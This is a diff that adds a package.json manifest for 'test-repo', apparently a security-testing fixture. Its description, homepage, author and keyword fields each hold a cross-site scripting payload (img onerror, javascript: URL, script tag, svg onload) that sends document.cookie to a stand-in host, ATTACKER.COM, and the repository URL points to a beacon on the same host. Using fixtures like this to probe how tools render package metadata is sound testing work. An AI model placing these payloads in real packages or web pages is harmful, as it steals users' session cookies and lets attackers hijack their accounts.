@@ -1,0 +1,18 @@
+{
+  "name": "test-repo",
+  "version": "1.0.0",
+  "description": "<img src=x onerror=\"fetch('https://ATTACKER.COM/pkg-desc?c='+document.cookie)\">",
+  "homepage": "javascript:fetch('https://ATTACKER.COM/pkg-homepage?c='+document.cookie)",
+  "repository": {
+    "type": "git",
+    "url": "https://ATTACKER.COM/beacon/pkg-repo-url"
+  },
+  "author": "<script>fetch('https://ATTACKER.COM/pkg-author?c='+document.cookie)</script>",
+  "license": "MIT",
+  "keywords": [
+    "<svg onload=fetch('https://ATTACKER.COM/pkg-keyword?c='+document.cookie)>"
+  ],
+  "dependencies": {
+    "lodash": "^4.17.21"
+  }
+}
